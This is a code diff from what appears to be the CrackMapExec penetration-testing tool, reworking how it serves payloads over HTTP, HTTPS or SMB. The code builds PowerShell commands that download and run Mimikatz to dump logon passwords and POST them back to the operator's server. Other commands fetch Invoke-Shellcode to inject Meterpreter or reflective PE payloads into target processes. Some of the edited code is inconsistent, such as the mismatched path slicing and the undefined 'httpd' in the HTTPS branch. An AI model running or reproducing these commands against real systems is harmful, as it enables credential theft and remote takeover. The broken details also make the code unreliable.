@@ -54,8 +54,6 @@ import string
 PERM_DIR = ''.join(random.sample(string.ascii_letters, 10))
 OUTPUT_FILENAME = ''.join(random.sample(string.ascii_letters, 10))
 BATCH_FILENAME  = ''.join(random.sample(string.ascii_letters, 10)) + '.bat'
-SMBSERVER_DIR   = 'served_over_smb'
-DUMMY_SHARE     = 'TMP'
 
 def print_error(message):
     try:
@@ -223,14 +221,14 @@ class SAMR_RPC_SID(Structure):
 class MimikatzServer(BaseHTTPRequestHandler):
 
     def do_GET(self):
-        if self.path[1:] in os.listdir('served_over_http'):
+        if self.path[5:] in os.listdir('hosted'):
             self.send_response(200)
             self.end_headers()
-            with open('served_over_http/'+ self.path[1:], 'r') as script:
+            with open('hosted/'+ self.path[4:], 'r') as script:
                 self.wfile.write(script.read())
 
         elif args.path:
-            if self.path[1:] == args.path.split('/')[-1]:
+            if self.path[6:] == args.path.split('/')[-1]:
                 self.send_response(200)
                 self.end_headers()
                 with open(args.path, 'rb') as rbin:
@@ -264,47 +262,6 @@ class MimikatzServer(BaseHTTPRequestHandler):
         with open('logs/' + log_name, 'w') as creds:
             creds.write(data)
         print_status("{} Saved POST data to {}".format(self.client_address[0], yellow(log_name)))
-
-class SMBServer(Thread):
-    def __init__(self):
-        Thread.__init__(self)
-
-    def run(self):
-        # Here we write a mini config for the server
-        smbConfig = ConfigParser.ConfigParser()
-        smbConfig.add_section('global')
-        smbConfig.set('global','server_name','yomama')
-        smbConfig.set('global','server_os','REDSTAR')
-        smbConfig.set('global','server_domain','WORKGROUP')
-        smbConfig.set('global','log_file', 'smb.log')
-        smbConfig.set('global','credentials_file','')
-
-        # Let's add a dummy share
-        smbConfig.add_section(DUMMY_SHARE)
-        smbConfig.set(DUMMY_SHARE,'comment','')
-        smbConfig.set(DUMMY_SHARE,'read only','no')
-        smbConfig.set(DUMMY_SHARE,'share type','0')
-        smbConfig.set(DUMMY_SHARE,'path',SMBSERVER_DIR)
-
-        # IPC always needed
-        smbConfig.add_section('IPC$')
-        smbConfig.set('IPC$','comment','')
-        smbConfig.set('IPC$','read only','yes')
-        smbConfig.set('IPC$','share type','3')
-        smbConfig.set('IPC$','path')
-
-        self.smb = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
-
-        self.smb.processConfigFile()
-        try:
-            self.smb.serve_forever()
-        except:
-            pass
-
-    def stop(self):
-        self.smb.socket.close()
-        self.smb.server_close()
-        self._Thread__stop()
 
 class OfflineRegistry:
     def __init__(self, hiveFile = None, isRemote = False):
@@ -2755,7 +2712,7 @@ def enum_shares(smb):
     return permissions
 
 def ps_command(command):
-    if args.ssl:
+    if args.server == 'https':
         command = "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" + command
 
     if args.force_ps32:
@@ -2768,52 +2725,50 @@ def ps_command(command):
     return ps_command
 
 def gen_mimikatz_command(localip, katz_command='privilege::debug sekurlsa::logonpasswords exit'):
-    protocol = 'http'
-    if args.ssl:
-        protocol = 'https'
 
-    command = """
-    IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}/Invoke-Mimikatz.ps1');
-    $creds = Invoke-Mimikatz -Command "{katz_command}";
-    $request = [System.Net.WebRequest]::Create('{protocol}://{addr}');
-    $request.Method = "POST";
-    $request.ContentType = "application/x-www-form-urlencoded";
-    $bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);
-    $request.ContentLength = $bytes.Length;
-    $requestStream = $request.GetRequestStream();
-    $requestStream.Write( $bytes, 0, $bytes.Length );
-    $requestStream.Close();
-    $request.GetResponse();
-    """.format(protocol=protocol, addr=localip, katz_command=katz_command)
+    protocol = args.server
+    if args.server == 'smb':
+        protocol = 'file'
+
+    command = "IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}/tmp/Invoke-Mimikatz.ps1');\
+$creds = Invoke-Mimikatz -Command '{katz_command}';\
+$request = [System.Net.WebRequest]::Create('{protocol}://{addr}/tmp');\
+$request.Method = 'POST';\
+$request.ContentType = 'application/x-www-form-urlencoded';\
+$bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);\
+$request.ContentLength = $bytes.Length;\
+$requestStream = $request.GetRequestStream();\
+$requestStream.Write( $bytes, 0, $bytes.Length );\
+$requestStream.Close();\
+$request.GetResponse();".format(protocol=protocol, addr=localip, katz_command=katz_command)
 
     return ps_command(command)
 
 def inject_pscommand(localip):
-    protocol = 'http'
-    if args.ssl:
-        protocol = 'https'
+
+    protocol = args.server
+    if args.server == 'smb':
+        protocol = 'file'
 
     if args.inject.startswith('met_'):
-        command = """
-        IEX (New-Object Net.WebClient).DownloadString('{}://{}/Invoke-Shellcode.ps1');
-        Invoke-Shellcode -Force -Payload windows/meterpreter/{} -Lhost {} -Lport {}""".format(protocol,
-                                                                                              localip,
-                                                                                              args.inject[4:], 
-                                                                                              args.met_options[0], 
-                                                                                              args.met_options[1])
+        command = "IEX (New-Object Net.WebClient).DownloadString('{}://{}/TMP/Invoke-Shellcode.ps1');\
+Invoke-Shellcode -Force -Payload windows/meterpreter/{} -Lhost {} -Lport {}".format(protocol,
+                                                                                  localip,
+                                                                                  args.inject[4:], 
+                                                                                  args.met_options[0], 
+                                                                                  args.met_options[1])
         if args.procid:
             command += " -ProcessID {}".format(args.procid)
 
         command += ';'
 
     elif args.inject == 'shellcode':
-        command = """
-        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}/Invoke-Shellcode.ps1');
-        $WebClient = New-Object System.Net.WebClient;
-        [Byte[]]$bytes = $WebClient.DownloadData('{protocol}://{addr}/{shellcode}');
-        Invoke-Shellcode -Force -Shellcode $bytes""".format(protocol=protocol,
-                                                            addr=localip,
-                                                            shellcode=args.path.split('/')[-1])
+        command = "IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}/tmp/Invoke-Shellcode.ps1');\
+$WebClient = New-Object System.Net.WebClient;\
+[Byte[]]$bytes = $WebClient.DownloadData('{protocol}://{addr}/tmp2/{shellcode}');\
+Invoke-Shellcode -Force -Shellcode $bytes".format(protocol=protocol,
+                                                 addr=localip,
+                                                 shellcode=args.path.split('/')[-1])
 
         if args.procid:
             command += " -ProcessID {}".format(args.procid)
@@ -2821,11 +2776,10 @@ def inject_pscommand(localip):
         command += ';'
 
     elif args.inject == 'exe' or args.inject == 'dll':
-        command = """
-        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}/Invoke-ReflectivePEInjection.ps1'); 
-        Invoke-ReflectivePEInjection -PEUrl {protocol}://{addr}/{pefile}""".format(protocol=protocol,
-                                                                                   addr=localip,
-                                                                                   pefile=args.path.split('/')[-1])
+        command = "IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}/tmp/Invoke-ReflectivePEInjection.ps1');\
+Invoke-ReflectivePEInjection -PEUrl {protocol}://{addr}/tmp2/{pefile}".format(protocol=protocol,
+                                                                             addr=localip,
+                                                                             pefile=args.path.split('/')[-1])
 
         if args.procid:
             command += " -ProcID {}"
@@ -3133,7 +3087,7 @@ if __name__ == '__main__':
     parser.add_argument("-n", metavar='NAMESPACE', dest='namespace', default='//./root/cimv2', help='WMI Namespace (default //./root/cimv2)')
     parser.add_argument("-s", metavar="SHARE", dest='share', default="C$", help="Specify a share (default: C$)")
     parser.add_argument("--port", dest='port', type=int, choices={139, 445}, default=445, help="SMB port (default: 445)")
-    parser.add_argument("--https", dest='ssl', action='store_true', help='Serve everything over https instead of http')
+    parser.add_argument("--server", choices={'http', 'https', 'smb'}, default='http', help='Use the selected server (defaults to http)')
     parser.add_argument("-v", action='store_true', dest='verbose', help="Enable verbose output")
     parser.add_argument("target", nargs=1, type=str, help="The target range, CIDR identifier or file containing targets")
 
@@ -3262,15 +3216,24 @@ if __name__ == '__main__':
 
     if args.mimikatz or args.mimi_cmd or args.inject or args.ntds == 'ninja':
         print_status("Press CTRL-C at any time to exit")
-        print_status('Note: This might take some time on large networks! Go grab a redbull!\n')
+        print_status("This might take some time on large networks! Go grab a redbull!\n")
 
-        if args.ssl:
-            httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), MimikatzServer)
-            httpd.socket = ssl.wrap_socket(httpd.socket, certfile='certs/crackmapexec.crt', keyfile='certs/crackmapexec.key', server_side=True)
-        else:
-            httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 80), MimikatzServer)
+        if args.server == 'http':
+            server = BaseHTTPServer.HTTPServer(('0.0.0.0', 80), MimikatzServer)
 
-        t = Thread(name='HTTPServer', target=httpd.serve_forever)
+        elif args.server == 'https':
+            server = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), MimikatzServer)
+            server.socket = ssl.wrap_socket(httpd.socket, certfile='certs/crackmapexec.crt', keyfile='certs/crackmapexec.key', server_side=True)
+
+        elif args.server == 'smb':
+            server = smbserver.SimpleSMBServer()
+            server.addShare('TMP', 'hosted')
+            if args.path:
+                server.addShare('TMP2', args.path, readonly='yes')
+            server.setSMB2Support(False)
+            server.serve_forever = server.start
+
+        t = Thread(name='server', target=server.serve_forever)
         t.setDaemon(True)
         t.start()
 
